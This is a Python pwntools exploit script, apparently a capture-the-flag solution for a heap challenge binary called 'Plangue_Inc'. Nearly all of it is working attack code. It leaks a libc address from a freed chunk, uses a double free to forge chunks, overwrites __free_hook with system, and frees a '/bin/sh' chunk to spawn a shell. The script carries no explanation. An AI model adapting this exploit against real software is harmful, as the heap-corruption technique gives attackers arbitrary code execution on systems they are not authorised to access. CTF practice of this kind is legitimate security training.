#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
close = lambda :p.close()

context.log_level = 'debug'


def menu(cmd):
    sla("Your choice:\n",str(cmd))

def infect(type,content,flag=1):
    menu(1)
    sla("Your choice:\n",str(type))
    if(flag == 0):
        sda("lives in:\n",content)
    else:
        sla("lives in:\n",content)

def destory(idx):
    menu(2)
    sla("country:",str(idx))

def breaks(idx,content):
    menu(3)
    sla("Index of country:",str(idx))
    sla("break out in?\n",content)

def check(idx):
    menu(4)
    sla("country:",str(idx))

def pwn():

    ###leak libc###
    infect(1,'aaaaaaaa')#0
    infect(2,'bbbbbbbb')#1

    destory(0)

    infect(1,'aaaaaaaa',0)#2

    check(2)

    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 88 - 0x3c4b20

    success('libc base:'+hex(libc_base))

    ###double free && forge chunk###
    system = libc_base + libc.symbols['system']
    free_hook = libc_base + libc.symbols['__free_hook']

    infect(6,'ddddd')#3
    infect(6,'eeeee')#4

    destory(3)
    destory(4)
    destory(3)

    infect(6,'\x60' + '\x31',0)#5
    infect(6,'eeeee')#6
    infect(6,'/bin/sh\x00')#7

    #gdb.attach(p)

    payload = p64(0x21)
    infect(6,payload,0)#8
    
    ###double free && hijack struct###
    destory(3)
    destory(4)
    destory(3)

    infect(6,'\x68' + '\x31',0)#9
    infect(6,'eeeee')#10
    infect(6,'/bin/sh\x00')#11
    infect(6,'/bin/sh\x00')#12

    payload = p64(free_hook)
    infect(6,payload,0)#13

    payload = p64(system)
    breaks(11,payload)

    ###get shell###
    destory(7)

while True:
    elf = ELF("./Plangue_Inc")
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

    try:
        global p
        p = process("./Plangue_Inc")

        pwn()
        ia()
    except:
        p.close()
